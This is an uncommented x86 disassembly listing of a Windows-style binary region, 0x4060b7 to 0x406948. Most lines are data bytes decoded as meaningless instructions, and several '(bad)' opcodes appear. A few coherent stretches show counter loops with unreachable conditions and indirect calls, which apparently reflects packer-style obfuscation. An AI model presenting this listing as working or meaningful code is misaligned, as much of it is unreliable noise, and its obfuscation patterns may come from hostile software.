  4060b7:	mov    ecx,0x6bc0ab7c
  4060bc:	(bad)  
  4060bd:	loopne 0x40606f
  4060bf:	mov    esi,0xbe46618b
  4060c4:	xchg   edi,eax
  4060c5:	into   
  4060c6:	and    BYTE PTR [edi+0x5d],dl
  4060c9:	gs mov esi,0xa8a69c36
  4060cf:	jbe    0x406086
  4060d1:	push   es
  4060d2:	adc    BYTE PTR [esp+edi*1+0x348bd3ea],ah
  4060d9:	push   cs
  4060da:	aaa    
  4060db:	jecxz  0x4060be
  4060dd:	je     0x405d65
  4060e3:	leave  
  4060e4:	ret    0x4
  4060e7:	push   ebp
  4060e8:	mov    ebp,esp
  4060ea:	sub    esp,0x2c
  4060ed:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  4060f4:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  4060fb:	mov    ecx,DWORD PTR ds:0x4346ef
  406101:	mov    eax,ds:0x43479b
  406106:	sub    eax,ecx
  406108:	add    ecx,DWORD PTR [ecx+eax*1]
  40610b:	mov    eax,0x9577
  406110:	and    DWORD PTR ds:0x4346d3,0x0
  40611a:	jmp    0x40612c
  40611f:	mov    ecx,DWORD PTR ds:0x4346d3
  406125:	inc    ecx
  406126:	mov    DWORD PTR ds:0x4346d3,ecx
  40612c:	cmp    DWORD PTR ds:0x4346d3,0x15
  406133:	jae    0x40615a
  406139:	cmp    DWORD PTR ds:0x4346d3,0x17
  406140:	jne    0x40614f
  406146:	push   DWORD PTR [ebp-0x10]
  406149:	call   DWORD PTR ds:0x4130c0
  40614f:	jmp    0x40611f
  406154:	adc    DWORD PTR ds:0x4346b7,edx
  40615a:	mov    WORD PTR [ebp-0x4],ax
  40615e:	and    DWORD PTR ds:0x4346fb,0x0
  406168:	mov    ecx,DWORD PTR ds:0x4346fb
  40616e:	inc    ecx
  40616f:	mov    DWORD PTR ds:0x4346fb,ecx
  406175:	cmp    DWORD PTR ds:0x4346fb,0x5
  40617c:	jne    0x40618b
  406182:	push   DWORD PTR [ebp-0x10]
  406185:	call   DWORD PTR ds:0x4133fc
  40618b:	cmp    DWORD PTR ds:0x4346fb,0x4
  406192:	jne    0x4061a7
  406198:	xor    ecx,ecx
  40619a:	or     ecx,DWORD PTR ds:0x4346fb
  4061a0:	inc    ecx
  4061a1:	mov    DWORD PTR ds:0x4346fb,ecx
  4061a7:	cmp    DWORD PTR ds:0x4346fb,0x1f
  4061ae:	jb     0x406168
  4061b4:	jmp    0x4065a2
  4061b9:	and    bl,al
  4061bb:	ss cmp ch,bh
  4061be:	cmc    
  4061bf:	lock jecxz 0x406145
  4061c2:	sahf   
  4061c3:	rol    ebp,1
  4061c5:	jge    0x40623e
  4061c7:	dec    edi
  4061c8:	dec    edx
  4061c9:	jae    0x40620a
  4061cb:	jle    0x40624b
  4061cd:	dec    edi
  4061ce:	jns    0x40624e
  4061d0:	jle    0x40622f
  4061d2:	cmp    eax,0xeee0ba9b
  4061d7:	and    BYTE PTR [edi-0x28ce2f81],dl
  4061dd:	rcl    esp,cl
  4061df:	xor    BYTE PTR [ecx-0x57d576de],ch
  4061e5:	dec    edi
  4061e6:	dec    ebp
  4061e7:	in     al,dx
  4061e8:	jmp    0x3625:0xf77af061
  4061ef:	inc    edi
  4061f0:	xor    al,0x59
  4061f2:	fs fs sti 
  4061f5:	std    
  4061f6:	add    al,0xb8
  4061f8:	xchg   esp,eax
  4061f9:	jmp    0x55bec72f
  4061fe:	mov    ah,0xfb
  406200:	je     0x4061a2
  406202:	outs   dx,DWORD PTR ds:[esi]
  406203:	mov    ecx,0xba81307d
  406208:	or     DWORD PTR [edx],0xffffffc1
  40620b:	(bad)  
  40620c:	pop    ds
  40620d:	xor    eax,0x6d8435c3
  406212:	mov    ds:0xa6112b33,al
  406217:	jnp    0x40623f
  406219:	adc    esp,DWORD PTR [ebp+0x57]
  40621c:	xor    eax,0x2719c298
  406221:	pushf  
  406222:	sti    
  406223:	xchg   DWORD PTR [esi],edi
  406225:	fild   QWORD PTR [ebp+edi*1-0x21dbb76c]
  40622c:	adc    eax,0xae0de9bf
  406231:	push   es
  406232:	div    DWORD PTR [esi-0x1af09673]
  406238:	or     DWORD PTR [esi+ecx*1],0x148581e3
  40623f:	(bad)  
  406240:	sub    DWORD PTR [edi],ebp
  406242:	or     DWORD PTR [esi+0x609ddada],ecx
  406248:	dec    ecx
  406249:	lahf   
  40624a:	mov    ah,0xaa
  40624c:	js     0x406249
  40624e:	fwait
  40624f:	sub    dh,bh
  406251:	sub    ah,dh
  406253:	sub    al,0x97
  406255:	xor    eax,0x36777c54
  40625a:	aas    
  40625b:	xchg   esp,eax
  40625c:	jnp    0x40629d
  40625e:	inc    edi
  40625f:	xor    cl,cl
  406261:	and    ebp,DWORD PTR [edi+0x15]
  406264:	mov    bl,0xe6
  406266:	cld    
  406267:	or     DWORD PTR [eax],ebx
  406269:	adc    edx,DWORD PTR [ecx+edi*4+0x6edd100a]
  406270:	xlat   BYTE PTR gs:[ebx]
  406272:	loope  0x4062e4
  406274:	scas   al,BYTE PTR es:[edi]
  406275:	(bad)  
  406276:	pop    ebx
  406277:	mov    esp,0x708f2ba
  40627c:	fwait
  40627d:	(bad)  
  40627e:	mov    bl,0xd4
  406280:	inc    edx
  406281:	adc    DWORD PTR [ebp+ebx*8-0xf18b2a5],0xd3b292aa
  40628c:	adc    bh,ah
  40628e:	push   cs
  40628f:	loope  0x4062af
  406291:	sahf   
  406292:	and    ebp,ecx
  406294:	aam    0x42
  406296:	sub    BYTE PTR [esi+0x23f94f5e],ch
  40629c:	add    edx,DWORD PTR [edi]
  40629e:	sub    BYTE PTR [esi-0x7c],dh
  4062a1:	cmp    esi,edi
  4062a3:	xchg   edi,eax
  4062a4:	jb     0x4062d8
  4062a6:	push   edx
  4062a7:	cmp    esp,edx
  4062a9:	sub    al,BYTE PTR [edx-0x7a]
  4062ac:	mov    ds:0x259b764d,al
  4062b1:	xor    eax,0xf9aa69c8
  4062b6:	mov    bh,0xbc
  4062b8:	dec    ecx
  4062b9:	and    ch,dh
  4062bb:	cmp    DWORD PTR [esi+0x11],esi
  4062be:	daa    
  4062bf:	cmp    eax,0x2e7cbfca
  4062c4:	inc    esp
  4062c5:	push   cs
  4062c6:	stos   DWORD PTR es:[edi],eax
  4062c7:	out    0x88,al
  4062c9:	pop    esp
  4062ca:	dec    eax
  4062cb:	in     al,0x72
  4062cd:	into   
  4062ce:	mov    ebx,0xb17b5999
  4062d3:	sti    
  4062d4:	jmp    0x406256
  4062d6:	ins    DWORD PTR es:[edi],dx
  4062d7:	and    esp,ebx
  4062d9:	mov    ss:0x26416a1c,eax
  4062df:	into   
  4062e0:	xlat   BYTE PTR ds:[ebx]
  4062e1:	inc    ebx
  4062e2:	add    BYTE PTR [ebp-0x41165e7d],ch
  4062e8:	mov    ds,WORD PTR [eax]
  4062ea:	mov    esi,0x9259f5b4
  4062ef:	mov    bl,0xe7
  4062f1:	xchg   esi,eax
  4062f2:	call   0xfc326558
  4062f7:	mov    ds:0xdbc3ae57,eax
  4062fc:	(bad)  
  4062fd:	bound  edi,QWORD PTR [edi-0xc]
  406300:	jecxz  0x4062b4
  406302:	and    ah,0xfc
  406305:	adc    DWORD PTR [ebx+0x3cd765f9],ebp
  40630b:	fs nop
  40630d:	imul   ecx,DWORD PTR [edx+0x5ca714c4],0xc778b64c
  406317:	loop   0x40638d
  406319:	mov    fs,WORD PTR [eax-0x1e8c5d64]
  40631f:	test   BYTE PTR [edx],dl
  406321:	and    eax,0xd85d98d
  406326:	jl     0x40630b
  406328:	jne    0x4062c1
  40632a:	call   0x8ab8:0xe4589c7d
  406331:	cmp    al,BYTE PTR [ecx+ecx*8+0x20]
  406335:	pop    ecx
  406336:	add    dh,BYTE PTR [edi]
  406338:	jl     0x40634e
  40633a:	add    eax,0x87fe1508
  40633f:	out    0x5e,al
  406341:	mov    ch,0xef
  406343:	pop    edx
  406344:	inc    esi
  406345:	movq   mm4,QWORD PTR [ecx+0x4f]
  406349:	jae    0x406399
  40634b:	xchg   BYTE PTR [edi-0x16a41dd5],bh
  406351:	in     eax,dx
  406352:	and    BYTE PTR [ecx-0x7bddf15d],ch
  406358:	push   ecx
  406359:	mov    bl,0x8c
  40635b:	imul   esi,ebx,0xffffff9a
  40635e:	test   DWORD PTR [eax+0x33a833cd],ebp
  406364:	cdq    
  406365:	cs sti 
  406367:	in     eax,dx
  406368:	mov    BYTE PTR [ebp+0x44],al
  40636b:	jmp    0x406350
  40636d:	push   es
  40636e:	mov    ah,0x3f
  406370:	dec    ebp
  406371:	(bad)  
  406372:	aad    0x4b
  406374:	xchg   ebp,eax
  406375:	sub    ebp,DWORD PTR [esi-0x16]
  406378:	pusha  
  406379:	push   es
  40637a:	push   ebx
  40637b:	pop    edi
  40637c:	lock fdivr QWORD PTR [edi+0x7817c7dc]
  406383:	test   DWORD PTR [eax],esp
  406385:	mov    al,ds:0xc6328a87
  40638a:	mov    ds:0x9939bf6c,eax
  40638f:	loope  0x406334
  406391:	dec    ebp
  406392:	std    
  406393:	outs   dx,DWORD PTR ds:[esi]
  406394:	rcr    BYTE PTR [esi],cl
  406396:	mov    dl,0x13
  406398:	add    al,bl
  40639a:	inc    ebx
  40639b:	sub    BYTE PTR [esi],0xd2
  40639e:	or     al,BYTE PTR [edx]
  4063a0:	jno    0x4063d2
  4063a2:	int    0x53
  4063a4:	popf   
  4063a5:	call   0x3055cb54
  4063aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063ab:	test   DWORD PTR [ecx],edi
  4063ad:	push   esi
  4063ae:	ret    
  4063af:	out    0x68,al
  4063b1:	sub    DWORD PTR [edi],0xd4d87915
  4063b7:	mov    esp,0x9577e8d9
  4063bc:	xor    esi,DWORD PTR [edx-0x1468cff5]
  4063c2:	pop    eax
  4063c3:	rcr    esi,1
  4063c5:	jmp    0xb13ddb85
  4063ca:	cmp    BYTE PTR [edi-0x7ffef5c0],dh
  4063d0:	aad    0xea
  4063d2:	(bad)  
  4063d3:	stos   BYTE PTR es:[edi],al
  4063d4:	xchg   ebp,eax
  4063d5:	mov    ds:0xa50ea8c,al
  4063da:	pushf  
  4063db:	je     0x4063ee
  4063dd:	ins    DWORD PTR es:[edi],dx
  4063de:	stos   BYTE PTR es:[edi],al
  4063df:	mov    eax,0xbee9a7b2
  4063e4:	sahf   
  4063e5:	adc    esp,DWORD PTR [ebx-0x17]
  4063e8:	dec    edx
  4063e9:	mov    ds:0x298c10ff,al
  4063ee:	nop
  4063ef:	add    eax,0xbaf7ec48
  4063f4:	adc    eax,0x7c9924e4
  4063f9:	sbb    al,0x10
  4063fb:	sbb    ebx,DWORD PTR [ebx-0x38]
  4063fe:	neg    BYTE PTR [esi+0x7615038]
  406404:	xor    BYTE PTR [edx],bl
  406406:	mov    BYTE PTR [ebx+0x36ff516c],dh
  40640c:	ret    
  40640d:	ret    0xca3a
  406410:	jmp    0x6bc:0x8f146531
  406417:	pop    ds
  406418:	adc    eax,0x295fdf66
  40641d:	iret   
  40641e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40641f:	jecxz  0x406410
  406421:	loop   0x406452
  406423:	jecxz  0x406480
  406425:	pop    ecx
  406426:	jle    0x40647b
  406428:	push   ss
  406429:	shl    BYTE PTR es:[ecx+0x2e],1
  40642d:	or     al,0x3c
  40642f:	outs   dx,DWORD PTR ds:[esi]
  406430:	xor    BYTE PTR [edi+0x9],0x2d
  406434:	out    dx,al
  406435:	ret    
  406436:	cmp    ebp,DWORD PTR [ebx+ebx*4+0x32708ef3]
  40643d:	push   ss
  40643e:	test   eax,0xec458d4
  406443:	out    0x6f,al
  406445:	or     DWORD PTR [esi+0x7d5028d2],edi
  40644b:	and    al,0x9f
  40644d:	popf   
  40644e:	push   ebp
  40644f:	inc    esi
  406450:	mov    dh,ch
  406452:	cs xchg esp,eax
  406454:	jns    0x4064cc
  406456:	inc    ecx
  406457:	test   bl,dl
  406459:	hlt    
  40645a:	or     edx,ecx
  40645c:	fist   DWORD PTR [ebx-0x7e]
  40645f:	ins    DWORD PTR es:[edi],dx
  406460:	dec    edx
  406461:	cmc    
  406462:	dec    ebp
  406463:	cdq    
  406464:	adc    eax,0x8c29ec81
  406469:	pop    ds
  40646a:	popf   
  40646b:	mov    dl,bh
  40646d:	jmp    0x406482
  40646f:	mov    ch,0x35
  406471:	rol    DWORD PTR [eax+0x4912ef3c],1
  406477:	lods   al,BYTE PTR ds:[esi]
  406478:	neg    BYTE PTR [edx+0x2c]
  40647b:	mov    WORD PTR [edi+0x5f],es
  40647e:	inc    edx
  40647f:	cmp    BYTE PTR [ebx+0x6d],0x44
  406483:	jl     0x4064e3
  406485:	mov    BYTE PTR [ecx+0x5e0817f5],dl
  40648b:	mov    esp,0x43632264
  406490:	pop    eax
  406491:	mov    DWORD PTR [eax+0x2e767ab5],0xa0f4fe30
  40649b:	mov    ds:0xf19c0c17,al
  4064a0:	and    esp,esp
  4064a2:	xchg   ebp,esi
  4064a4:	mov    esi,0xfe417b
  4064a9:	imul   edi,DWORD PTR [ecx],0xc0dc076c
  4064af:	jg     0x40650a
  4064b1:	mov    ecx,0x5b6350c1
  4064b6:	ret    
  4064b7:	cs xor eax,0x5c3fb3aa
  4064bd:	test   al,0xc3
  4064bf:	cmp    dl,BYTE PTR [ebx]
  4064c1:	test   BYTE PTR [eax-0x5f0a6e7d],0xff
  4064c8:	sbb    eax,0x8da85889
  4064cd:	xchg   ebx,eax
  4064ce:	loopne 0x406543
  4064d0:	xchg   DWORD PTR [eax],eax
  4064d2:	and    ah,BYTE PTR [esi+esi*2-0x7f]
  4064d6:	stos   BYTE PTR es:[edi],al
  4064d7:	mov    eax,ds:0x590a53f4
  4064dc:	ins    BYTE PTR es:[edi],dx
  4064dd:	daa    
  4064de:	sub    al,dl
  4064e0:	mov    esi,DWORD PTR [esi]
  4064e2:	pop    esi
  4064e3:	les    esp,FWORD PTR [edi+0x4d6ac5fd]
  4064e9:	mov    al,BYTE PTR [ebx-0x528ac846]
  4064ef:	jns    0x40647c
  4064f1:	push   0x31ade77c
  4064f6:	loop   0x40648c
  4064f8:	cmp    eax,0x47cdc917
  4064fd:	je     0x406551
  4064ff:	mov    ebx,DWORD PTR [ebp-0x12e64970]
  406505:	xchg   DWORD PTR [esi-0x18ef21b1],esi
  40650b:	repnz mov esi,ecx
  40650e:	mov    WORD PTR [eax+ecx*4-0x73],gs
  406512:	call   0xa628:0x99ac5d58
  406519:	dec    edx
  40651a:	popa   
  40651b:	add    al,0x7f
  40651d:	add    DWORD PTR [edx-0x45065f4c],eax
  406523:	mov    ebp,0xae3797f2
  406528:	fwait
  406529:	push   es
  40652a:	inc    ebp
  40652b:	and    DWORD PTR [edx-0x680c4cc1],ecx
  406531:	push   ebx
  406532:	out    dx,eax
  406533:	or     ecx,DWORD PTR ds:0xc350897f
  406539:	mov    WORD PTR [ebx+0x5da41966],ds
  40653f:	push   ecx
  406540:	or     ecx,ecx
  406542:	clc    
  406543:	ds nop
  406545:	test   eax,0x6097162
  40654b:	xchg   esi,eax
  40654c:	adc    BYTE PTR [eax-0x37902745],dl
  406552:	push   ecx
  406553:	jge    0x4065af
  406555:	ret    0xb5e9
  406558:	xor    DWORD PTR [edx],edx
  40655a:	push   es
  40655b:	inc    ebx
  40655c:	add    eax,0xa806945f
  406561:	iret   
  406562:	shl    esp,cl
  406564:	clc    
  406565:	dec    edi
  406566:	adc    DWORD PTR [ebx],ebp
  406568:	inc    esi
  406569:	adc    eax,0x68551b5a
  40656e:	dec    esi
  40656f:	pop    ebp
  406570:	mov    dh,0x7b
  406572:	push   ecx
  406573:	fwait
  406574:	or     esp,ebx
  406576:	je     0x406539
  406578:	mov    DWORD PTR [ebx],edi
  40657a:	mov    esp,0x46283046
  40657f:	pop    ebp
  406580:	push   ebp
  406581:	leave  
  406582:	sub    eax,0x975b6e7c
  406587:	loope  0x4065d2
  406589:	dec    edi
  40658a:	pop    esi
  40658b:	cmp    edi,ebp
  40658d:	pop    edi
  40658e:	xchg   ebx,eax
  40658f:	xchg   esp,eax
  406590:	fist   WORD PTR [edi-0x4d]
  406593:	sbb    al,dl
  406595:	sahf   
  406596:	icebp  
  406597:	push   ebp
  406598:	adc    BYTE PTR [eax+0x50],bh
  40659b:	pop    esi
  40659c:	pop    es
  40659d:	imul   ebp,DWORD PTR [esi],0x8d2030f1
  4065a3:	inc    ebp
  4065a4:	fmul   QWORD PTR [edi]
  4065a6:	mov    bh,0xd
  4065a8:	cmp    eax,DWORD PTR [edi+0x43]
  4065ab:	add    BYTE PTR [ebx],ah
  4065ad:	or     eax,0x434673
  4065b2:	mov    DWORD PTR ds:0x43473b,ecx
  4065b8:	mov    DWORD PTR [ebp-0x28],eax
  4065bb:	adc    DWORD PTR ds:0x43467f,ecx
  4065c1:	mov    eax,DWORD PTR [ebp+0x8]
  4065c4:	sbb    ecx,DWORD PTR ds:0x43478f
  4065ca:	mov    DWORD PTR [ebp-0x20],eax
  4065cd:	push   ebx
  4065ce:	sub    DWORD PTR ds:0x434677,ebx
  4065d4:	lea    eax,[ebp-0x18]
  4065d7:	mov    DWORD PTR [ebp-0x1c],eax
  4065da:	xor    DWORD PTR ds:0x4346cf,edx
  4065e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4065e3:	and    DWORD PTR ds:0x43466b,0x0
  4065ed:	mov    ecx,DWORD PTR ds:0x43466b
  4065f3:	inc    ecx
  4065f4:	mov    DWORD PTR ds:0x43466b,ecx
  4065fa:	cmp    DWORD PTR ds:0x43466b,0x1e
  406601:	jne    0x40661a
  406607:	push   DWORD PTR [ebp-0x14]
  40660a:	push   0x4346c7
  40660f:	push   0x43499f
  406614:	call   DWORD PTR ds:0x413400
  40661a:	cmp    DWORD PTR ds:0x43466b,0x1c
  406621:	jb     0x4065ed
  406627:	jmp    0x406a15
  40662c:	call   0x70d95cef
  406631:	mov    al,0x70
  406633:	dec    esi
  406634:	mov    BYTE PTR [ecx],dh
  406636:	push   esi
  406637:	inc    esp
  406638:	iret   
  406639:	and    esp,ecx
  40663b:	push   esi
  40663c:	dec    esp
  40663d:	cmp    edi,DWORD PTR [esi+0x7e]
  406640:	dec    edi
  406641:	jns    0x4066c1
  406643:	jle    0x40665f
  406645:	sub    eax,0xf4677dcf
  40664a:	loope  0x4066a7
  40664c:	add    eax,0x91ecdb60
  406651:	and    eax,esp
  406653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406654:	retf   
  406655:	pop    ss
  406656:	xor    dl,dl
  406658:	out    dx,eax
  406659:	or     al,BYTE PTR [ebx-0x383981f1]
  40665f:	inc    esp
  406660:	or     eax,0xca4deda2
  406665:	int3   
  406666:	arpl   WORD PTR [ebx+ecx*4+0x70],ax
  40666a:	iret   
  40666b:	adc    eax,DWORD PTR [ecx]
  40666d:	push   cs
  40666e:	(bad)  
  40666f:	retf   
  406670:	and    eax,0xbba1b3be
  406675:	retf   
  406676:	retf   
  406677:	cmp    BYTE PTR [eax],bl
  406679:	add    al,BYTE PTR [ecx]
  40667b:	test   al,0x7d
  40667d:	or     eax,ecx
  40667f:	fst    DWORD PTR [edx-0x489ac52a]
  406685:	test   BYTE PTR [eax+eax*2+0x3d],0x81
  40668a:	sbb    al,dl
  40668c:	outs   dx,BYTE PTR ds:[esi]
  40668d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40668e:	scas   eax,DWORD PTR es:[edi]
  40668f:	cmc    
  406690:	or     edi,DWORD PTR [ecx-0x1fbf5a17]
  406696:	sub    BYTE PTR [edi-0x7ae2fd3d],dh
  40669c:	rcl    BYTE PTR [ebx-0x1292c451],cl
  4066a2:	xchg   edx,eax
  4066a3:	xchg   BYTE PTR [edi+0x12aa20b2],cl
  4066a9:	push   es
  4066aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066ab:	shl    BYTE PTR [eax-0x1638c1],0xb
  4066b2:	mov    ds:0xc0f4a2e5,al
  4066b7:	fwait
  4066b8:	inc    edx
  4066b9:	xchg   esi,eax
  4066ba:	add    edx,ecx
  4066bc:	dec    ecx
  4066bd:	pop    ds
  4066be:	and    al,0xad
  4066c0:	les    ebp,FWORD PTR [eax]
  4066c2:	cli    
  4066c3:	add    BYTE PTR [ebx-0x48],ch
  4066c6:	dec    esi
  4066c7:	scas   al,BYTE PTR es:[edi]
  4066c8:	mov    ch,0x43
  4066ca:	mul    BYTE PTR [ebx+0x7d4a0e2c]
  4066d0:	and    ebp,DWORD PTR [edx-0x3f]
  4066d3:	jno    0x406667
  4066d5:	out    0xc3,al
  4066d7:	stos   DWORD PTR es:[edi],eax
  4066d8:	sahf   
  4066d9:	into   
  4066da:	nop
  4066db:	cmp    bh,BYTE PTR [ebx+0x220dcc64]
  4066e1:	pop    ecx
  4066e2:	mov    bl,0xaf
  4066e4:	xor    al,0x3a
  4066e6:	and    DWORD PTR [eax-0x4412a197],edi
  4066ec:	or     eax,esi
  4066ee:	push   cs
  4066ef:	imul   ecx,DWORD PTR [edx],0xffffffb6
  4066f2:	in     al,0xb7
  4066f4:	cs es and al,0x52
  4066f8:	jle    0x406695
  4066fa:	mov    ebx,0x804710df
  4066ff:	sti    
  406700:	push   ebp
  406701:	rcl    DWORD PTR [esi],0x46
  406704:	xor    BYTE PTR [esi+0x73],cl
  406707:	sub    BYTE PTR [ebp+0x58],dl
  40670a:	jge    0x4066b0
  40670c:	les    eax,FWORD PTR [ebp-0x7c1ae29c]
  406712:	xor    al,BYTE PTR [ebx]
  406714:	pop    edx
  406715:	xor    cl,BYTE PTR [ebp+0x107ef31a]
  40671b:	call   0xfd3c79d9
  406720:	and    DWORD PTR [eax],ebx
  406722:	icebp  
  406723:	jno    0x4066d8
  406725:	and    al,0x9f
  406727:	inc    ecx
  406728:	dec    edi
  406729:	or     ebx,DWORD PTR [esi+0x15]
  40672c:	rcl    DWORD PTR [edi],cl
  40672e:	jp     0x406767
  406730:	xchg   ecx,eax
  406731:	out    0x6a,al
  406733:	xor    edi,esp
  406735:	add    eax,0xe6055e7f
  40673a:	sub    DWORD PTR [edi],ecx
  40673c:	inc    edx
  40673d:	retf   0xeb74
  406740:	dec    ebx
  406741:	lahf   
  406742:	mov    esp,0xc972e16a
  406747:	and    BYTE PTR [esi+0x2db0f50],dl
  40674d:	lds    ebp,FWORD PTR [edi+0x37]
  406750:	loopne 0x4067bb
  406752:	lods   al,BYTE PTR ds:[esi]
  406753:	cli    
  406754:	push   esi
  406755:	jo     0x40672a
  406757:	mov    ds:0x81b65b55,al
  40675c:	and    ebx,ecx
  40675e:	dec    edi
  40675f:	xor    DWORD PTR [ebx-0x421a5491],edi
  406765:	pop    esp
  406766:	or     ebx,DWORD PTR [edi]
  406768:	out    0xcd,eax
  40676a:	das    
  40676b:	pop    ecx
  40676c:	js     0x4067bd
  40676e:	call   0xb6a5:0x74e80e04
  406775:	adc    BYTE PTR [ebx-0x4c],bh
  406778:	das    
  406779:	cli    
  40677a:	xchg   ecx,eax
  40677b:	fstp   QWORD PTR [edi-0x6c4e0478]
  406781:	jne    0x40671f
  406783:	mov    cl,0x96
  406785:	pop    ds
  406786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406787:	push   cs
  406788:	push   ds
  406789:	jecxz  0x4067fc
  40678b:	xor    BYTE PTR [ebx-0x7d],cl
  40678e:	call   0x4d05:0x699abe64
  406795:	sbb    edi,DWORD PTR [ebx-0x90f6b9e]
  40679b:	stc    
  40679c:	xor    ebx,eax
  40679e:	fxam   
  4067a0:	pop    ebp
  4067a1:	test   eax,0xacbfe207
  4067a6:	movhps QWORD PTR [eax],xmm5
  4067a9:	ds push ebp
  4067ab:	jbe    0x406760
  4067ad:	into   
  4067ae:	and    bl,BYTE PTR [edi-0x3e]
  4067b1:	test   eax,0xdbc32a8d
  4067b6:	sub    edx,DWORD PTR [edx+edi*1+0x10c7846c]
  4067bd:	dec    esi
  4067be:	mov    ch,0x5b
  4067c0:	into   
  4067c1:	fldcw  WORD PTR [ecx-0x63]
  4067c4:	cmp    cl,ah
  4067c6:	adc    DWORD PTR [edx+edx*2],eax
  4067c9:	inc    ebp
  4067ca:	rol    esi,0x1e
  4067cd:	js     0x406835
  4067cf:	ins    BYTE PTR es:[edi],dx
  4067d0:	push   ds
  4067d1:	cmp    BYTE PTR [edx+0x54],cl
  4067d4:	stos   BYTE PTR es:[edi],al
  4067d5:	push   es
  4067d6:	aas    
  4067d7:	push   ss
  4067d8:	sub    BYTE PTR ds:0x578ee9eb,0xb8
  4067df:	pop    esi
  4067e0:	jecxz  0x40683a
  4067e2:	push   es
  4067e3:	aad    0xc7
  4067e5:	inc    edi
  4067e6:	sub    al,0xe5
  4067e8:	add    BYTE PTR [ecx+0x595dfad6],bh
  4067ee:	adc    eax,0xc9f62a19
  4067f3:	pop    ebp
  4067f4:	(bad)  
  4067f5:	fadd   DWORD PTR [ecx]
  4067f7:	and    edx,DWORD PTR [ecx]
  4067f9:	pushf  
  4067fa:	push   ebx
  4067fb:	xor    DWORD PTR [edi-0x6e],edx
  4067fe:	sbb    BYTE PTR [esi+0x14a8c011],ah
  406804:	push   edx
  406805:	mov    esi,ds
  406807:	add    BYTE PTR [esi-0x80],dl
  40680a:	test   al,0x1e
  40680c:	pop    ebp
  40680d:	fist   WORD PTR [eax-0x22]
  406810:	and    DWORD PTR [ebx+0x11370d86],ebx
  406816:	scas   al,BYTE PTR es:[edi]
  406817:	test   al,0x87
  406819:	cli    
  40681a:	or     al,dl
  40681c:	adc    ch,bl
  40681e:	jae    0x40687e
  406820:	pusha  
  406821:	sbb    eax,ecx
  406823:	ins    BYTE PTR es:[edi],dx
  406824:	and    BYTE PTR [ebp-0x6d],cl
  406827:	cmp    esi,DWORD PTR [eax-0x3bd1c0ac]
  40682d:	push   0xb2c36417
  406832:	iret   
  406833:	cmp    DWORD PTR [ecx-0x955a7ca],edx
  406839:	fnstsw WORD PTR [ecx-0x1e132065]
  40683f:	adc    al,0xff
  406841:	adc    eax,0xf701b6e5
  406846:	push   esi
  406847:	lods   al,BYTE PTR ds:[esi]
  406848:	mov    ds:0xff21d42b,eax
  40684d:	xor    eax,0xa6dab356
  406852:	push   edx
  406853:	mov    cl,0x46
  406855:	add    al,0x43
  406857:	adc    dh,cl
  406859:	mov    eax,ds:0xe1c6d114
  40685e:	mov    edx,0xdd281bc8
  406863:	add    ah,BYTE PTR [ebx]
  406865:	mov    ebp,0xb6b05fad
  40686a:	mov    eax,ds:0xb53a4664
  40686f:	or     BYTE PTR [esp+ebx*4],ch
  406872:	ror    DWORD PTR [edx+0x4e],0x71
  406876:	sub    eax,0x1160782f
  40687b:	push   es
  40687c:	inc    ecx
  40687d:	rol    DWORD PTR [edx],cl
  40687f:	pop    edx
  406880:	pushf  
  406881:	aam    0xdf
  406883:	add    BYTE PTR [ebx+0x13],dh
  406886:	ret    0xcd92
  406889:	repnz retf 0xb428
  40688d:	push   es
  40688e:	push   ds
  40688f:	loop   0x4068e9
  406891:	add    edx,DWORD PTR [eax-0x69]
  406894:	xchg   edi,eax
  406895:	out    dx,eax
  406896:	dec    ecx
  406897:	(bad)  
  406899:	lea    ebp,[eax-0x6c]
  40689c:	cli    
  40689d:	push   esi
  40689e:	out    dx,eax
  40689f:	pop    ebx
  4068a0:	inc    esi
  4068a1:	sub    ch,BYTE PTR [eax]
  4068a3:	xchg   edx,eax
  4068a4:	bound  ebx,QWORD PTR [ebp+0x62b74c7f]
  4068aa:	aam    0x5e
  4068ac:	pop    edx
  4068ad:	test   DWORD PTR [ecx],0xd1ed4386
  4068b3:	add    eax,0xc22388c2
  4068b8:	inc    eax
  4068b9:	sub    DWORD PTR [ecx-0x22],0xffffffd3
  4068bd:	retf   
  4068be:	aaa    
  4068bf:	test   BYTE PTR [ecx+esi*4+0xf73ef83],bl
  4068c6:	nop
  4068c7:	aas    
  4068c8:	loopne 0x406882
  4068ca:	loop   0x406854
  4068cc:	pop    ss
  4068cd:	lods   eax,DWORD PTR ds:[esi]
  4068ce:	xor    bl,BYTE PTR [eax+esi*2-0x79514373]
  4068d5:	or     eax,DWORD PTR [edx+0x3f]
  4068d8:	lock mov cl,0x18
  4068db:	mov    dh,0xc6
  4068dd:	mov    bh,0x51
  4068df:	(bad)  
  4068e0:	jmp    0x50ccf136
  4068e5:	repz inc esi
  4068e7:	ds ret 
  4068e9:	jne    0x406876
  4068eb:	enter  0x5540,0x3d
  4068ef:	or     BYTE PTR [ebx+0xe],ah
  4068f2:	mov    ds:0xd88418f4,al
  4068f7:	fisttp QWORD PTR [edi+0x7d651fb2]
  4068fd:	push   esp
  4068fe:	jne    0x40695f
  406900:	dec    ebp
  406901:	dec    esp
  406902:	add    eax,0xf2482901
  406907:	add    ebx,DWORD PTR [edx]
  406909:	jecxz  0x4068a6
  40690b:	xchg   ebx,eax
  40690c:	xchg   DWORD PTR [ebx-0x38],ebx
  40690f:	fcom   DWORD PTR [eax+0x242b1929]
  406915:	inc    esi
  406916:	xchg   edx,eax
  406917:	out    dx,eax
  406918:	(bad)  
  40691a:	inc    ebx
  40691b:	mov    edi,0x6848b21
  406920:	mov    ecx,edi
  406922:	repnz mov bh,0xe
  406925:	cwde   
  406926:	bound  ebx,QWORD PTR ds:0xc0bd5214
  40692c:	test   eax,0x732d3323
  406931:	arpl   WORD PTR [edi-0x457d9ab8],ax
  406937:	jns    0x40696c
  406939:	outs   dx,BYTE PTR ds:[esi]
  40693a:	mov    eax,0xec42d231
  40693f:	test   BYTE PTR [eax+0x5e],dh
  406942:	add    DWORD PTR [esi-0x585f4ffe],eax
  406948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
